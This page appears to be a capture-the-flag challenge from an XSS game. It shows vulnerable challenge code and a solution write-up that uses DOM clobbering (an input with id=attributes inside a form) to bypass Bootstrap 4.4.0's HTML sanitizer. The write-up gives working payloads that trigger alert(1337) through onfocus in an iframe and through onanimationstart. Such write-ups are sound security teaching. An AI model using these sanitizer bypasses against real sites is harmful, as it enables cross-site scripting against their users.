---
title: "XSS Game - Ded | PwnFunction"
header: "Ded"
challengeUrl: "https://sandbox.pwnfunction.com/challenges/ded.html"
date: 2020-04-01T01:07:10+05:30
draft: false
type: challenge
difficulty: Medium
solvers: 7
---

<!-- Rules -->
{{< rules >}}
<li>Difficulty is <b>Medium</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
<li><i>Challenge was downgraded because of Jquery's endless mutations</i>.</li>
<li>Unintended solution? DM me <a target="_blank"
                            href="https://twitter.com/messages/compose?recipient_id=1084132461133451264"
                            class="function">@PwnFunction</a>.
                    </li>
{{</ rules >}}

<!-- Challenge Code -->
{{< code >}}<code class="language-markup">&#x3C;!-- Challenge --&#x3E;
&#x3C;div id=&#x22;ded&#x22;&#x3E;
    &#x3C;button type=&#x22;button&#x22; class=&#x22;btn btn-lg btn-danger&#x22; data-toggle=&#x22;popover&#x22; title=&#x22;Hints&#x22; data-html=&#x22;true&#x22;
        data-content=&#x22;&#x3C;li&#x3E;Anything different about this challenge?&#x3C;/li&#x3E;
        &#x3C;li&#x3E;Look Deeper!&#x3C;/li&#x3E;&#x22;&#x3E;Lemme help you.&#x3C;/button&#x3E;
&#x3C;/div&#x3E;

&#x3C;script&#x3E;
    /* Inputs */
    let code = (new URL(location).searchParams.get(&#x27;code&#x27;)).replace(/script/ig, &#x22;_&#x22;) || &#x60;&#x3C;li&#x3E;&#x3C;strike&#x3E;ded&#x3C;/strike&#x3E;&#x3C;/li&#x3E;&#x60;

    let clean = DOMPurify.sanitize(code, { SAFE_FOR_JQUERY: true })
    document.getElementById(&#x27;ded&#x27;).innerHTML += clean
&#x3C;/script&#x3E;

&#x3C;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.0) --&#x3E;
&#x3C;script src=&#x22;https://code.jquery.com/jquery-3.4.1.slim.min.js&#x22;
integrity=&#x22;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&#x22;
crossorigin=&#x22;anonymous&#x22;&#x3E;&#x3C;/script&#x3E;
&#x3C;script src=&#x22;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&#x22;
integrity=&#x22;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&#x22;
crossorigin=&#x22;anonymous&#x22;&#x3E;&#x3C;/script&#x3E;
&#x3C;script src=&#x22;https://stackpath.bootstrapcdn.com/bootstrap/4.4.0/js/bootstrap.min.js&#x22;
integrity=&#x22;sha384-3qaqj0lc6sV/qpzrc1N5DC6i1VRn/HyX4qdPaiEFbn54VjQBEU341pvjz7Dv3n6P&#x22;
crossorigin=&#x22;anonymous&#x22;&#x3E;&#x3C;/script&#x3E;

&#x3C;script&#x3E;
/* Extend Bootstrap Popover */
let whiteList = $.fn.tooltip.Constructor.Default.whiteList
whiteList.form = []

/* Popovers! */
$(function () {
    $(&#x27;[data-toggle=&#x22;popover&#x22;]&#x27;).popover(&#x27;show&#x27;)
})
&#x3C;/script&#x3E;
</code>{{< /code >}}

<!-- Solvers -->
{{< solvers >}}
<tr>
    <th scope="row">1</th>
    <td><a href="https://twitter.com/@shafigullin" target="_blank" class="function">Roman</a>
    </td>
    <td>Unintended (fixed) & Intended</td>
</tr>
<tr>
    <th scope="row">2</th>
    <td><a href="https://twitter.com/@terjanq" target="_blank" class="function">terjanq</a>
    </td>
    <td>Unintended x 2 (fixed) & Intended</td>
</tr>
<tr>
    <th scope="row">3</th>
    <td><a href="https://twitter.com/@BitK_" target="_blank" class="function">BitK</a>
    </td>
    <td>Intended (original challenge)</td>
</tr>
<tr>
    <th scope="row">4</th>
    <td><a href="https://twitter.com/@Black2Fan" target="_blank" class="function">Sergey Bobrov</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">5</th>
    <td><a href="https://twitter.com/@SecurityMB" target="_blank" class="function">Michał Bentkowski</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">6</th>
    <td><a href="https://twitter.com/@ZeddYu_Lu" target="_blank" class="function">Zeddy</a>
    </td>
    <td>Intended</td>
</tr>
<tr>
    <th scope="row">7</th>
    <td><a href="https://twitter.com/@raaavr" target="_blank" class="function">Rafał Rykowski</a>
    </td>
    <td>Intended</td>
</tr>
{{< /solvers >}}

<!-- Solution Modal -->
{{< solution >}}
Solution is ...
<pre class="solution-code-block"><code class="language-markup">&#x3C;button data-toggle=&#x22;popover&#x22; data-html=&#x22;true&#x22; data-content=&#x22;&#x3C;form class=&#x27;spinner-grow&#x27; onanimationstart=alert(1337)&#x3E;&#x3C;input id=attributes&#x3E;&#x22;&#x3E;yo!&#x3C;/button&#x3E;</code></pre>

First off, notice that <b>Bootstrap(4.4.0)</b> is used instead of the latest version, which means it's something specific to it. There's a button, which is a popover showing a bunch of hints for the challenge. From the code below, you can see that all elements with <code>data-toggle="popover"</code> becomes a Bootstrap Popover. 

<pre class="solution-code-block"><code class="language-js">/* Popovers! */
$(function () {
    $(&#x27;[data-toggle=&#x22;popover&#x22;]&#x27;).popover(&#x27;show&#x27;)
})</code></pre>

Here it calls with <code>'show'</code> as it's argument, which means the popovers are automatically shown to the user. Popovers can have their content set via HTML, which should be interesting for us since it takes the HTML as a string like you see down below.

<pre class="solution-code-block"><code class="language-markup">&#x3C;button data-toggle=&#x22;popover&#x22; data-html=&#x22;true&#x22; data-content=&#x22;&#x3C;h1&#x3E;I&#x27;m a header&#x3C;/h1&#x3E;&#x22;&#x3E;yo!&#x3C;/button&#x3E;</code></pre>

Where <code>&#x3C;h1&#x3E;I&#x27;m a header&#x3C;/h1&#x3E;</code> becomes the header element inside the popover. But the HTML is sanitized by <a target=_blank class=function href="https://github.com/twbs/bootstrap/blob/v4.4.0/js/src/tools/sanitizer.js">custom sanitizer</a>. The sanitizer has a <a target=_blank href="https://github.com/twbs/bootstrap/blob/v4.4.0/js/src/tools/sanitizer.js#L21" class=function>Default Whitelist</a>, but the challenge adds a new element into the whitelist, see below.

<pre class="solution-code-block"><code class="language-js">let whiteList = $.fn.tooltip.Constructor.Default.whiteList
whiteList.form = []</code></pre>

Empty array indicates, no extra attributes execpt what bootstrap allows. <br />

<code>['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN]</code> <br /><br />

Now, one of the hints was to look "deeper", which means you gotta look into the <a target=_blank class=function href="https://github.com/twbs/bootstrap/blob/v4.4.0/js/src/tools/sanitizer.js">sanitizer</a> and see if there's a way out. If you look closely at the source, you'll find some places where you can do some <a class=pwn href="https://youtu.be/2up8J9dErHI?t=797" target=_blank>DOM Clobbering</a>. One such places is <a target=_blank class=pwn href="https://github.com/twbs/bootstrap/blob/master/js/src/util/sanitizer.js#L116">here</a>.

<pre class="solution-code-block"><code class="language-js">const attributeList = [].concat(...el.attributes)</code></pre>

If the element is <code>form</code>, then we can clobber the properties of that element using some of it's child elements. In this case, we want to clobber <code>attributes</code>, because if we fool the sanitizer by tricking that there are no attributes on the element, then we can do a lot of damage. So we can do something like the following.

<pre class="solution-code-block"><code class="language-markup">&#x3C;form&#x3E;
  &#x3C;input id=attributes&#x3E;</code></pre>

Now when the sanitizer tries to get all the attributes of the <b>form</b> element, it gets the <b>HTMLInputElement</b> instead of the actual attributes on the <b>form</b> element. Further, when it does a <code>concat</code> on the <b>HTMLInputElement</b>, it returns a empty array, which means we've successfully fooled the sanitizer into thinking that there are no attributes on the form.

<pre class="solution-code-block"><code class="language-js">[].concat(HTMLInputElement) // returns []</code></pre>

Now let's craft this, 

<pre class="solution-code-block"><code class="language-markup">&#x3C;button data-toggle=&#x22;popover&#x22; data-html=&#x22;true&#x22; data-content=&#x22;&#x3C;form onmouseover=alert(0)&#x3E;xxx&#x3C;input id=attributes&#x3E;&#x22;&#x3E;yo!&#x3C;/button&#x3E;</code></pre>

This is fine, we have an XSS, but it requires User Interaction, and the challenge clearly states you shouldn't rely on it. There are two ways to go about this. <br /><br />

<p><b><u>First Way</u></b></p>
We can use <code>onfocus</code> event handler on <code>form</code> element, but it won't be autofocused, so to do this we can frame the challenge webpage inside an <code>&#x3C;iframe&#x3E;</code> and then wait for a fews seconds so that the page is loaded and then update the hash. This will focus on the iframe, but also doesn't reload the whole iframe, which will trigger the XSS.

<pre class="solution-code-block"><code class="language-markup">&#x3C;!-- Frame the challenge --&#x3E;
&#x3C;iframe name=x src=&#x22;https://sandbox.pwnfunction.com/challenges/ded.html?code=&#x3C;button data-toggle=popover data-html=true data-content=&#x27;&#x3C;form tabindex=1 onfocus=alert(1337) id=x&#x3E;&#x3C;input id=attributes&#x3E;xxx&#x3C;/input&#x3E;&#x3C;/form&#x3E;&#x27;&#x3E;&#x3C;/button&#x3E;&#x22;&#x3E;&#x3C;/iframe&#x3E;

&#x3C;!-- wait &#x26; update --&#x3E;
&#x3C;script&#x3E;setTimeout(function(){x.location=&#x22;https://sandbox.pwnfunction.com/challenges/ded.html?code=&#x3C;button data-toggle=popover data-html=true data-content=&#x27;&#x3C;form tabindex=1 onfocus=alert(1337) id=x&#x3E;&#x3C;input id=attributes&#x3E;xxx&#x3C;/input&#x3E;&#x3C;/form&#x3E;&#x27;&#x3E;xxx&#x3C;/button&#x3E;#x&#x22;},3000)&#x3C;/script&#x3E;</code></pre><br />

<p><b><u>Second Way</u></b></p>
We can use <code>onanimationstart</code> on the <code>form</code> element, but to do this we should have an animation keyframe, so we need the <code>style</code> tag to add keyframes, but guess what, style tags aren't in the whitelist, so what do we do? We can simply use one of the available animations from bootstrap, duh, ez. 

<pre class="solution-code-block"><code class="language-markup">&#x3C;button data-toggle=&#x22;popover&#x22; data-html=&#x22;true&#x22; data-content=&#x22;&#x3C;form class=&#x27;spinner-grow&#x27; onanimationstart=alert(1337)&#x3E;&#x3C;input id=attributes&#x3E;&#x22;&#x3E;yo!&#x3C;/button&#x3E;</code></pre>

Here, I've used <code>spinner-grow</code> from <a target=_blank class=function href="https://github.com/twbs/bootstrap/blob/64050f43bc28106c697cedb4c9291ac6572b4d4e/scss/_spinners.scss#L31">here</a>.

{{< /solution >}}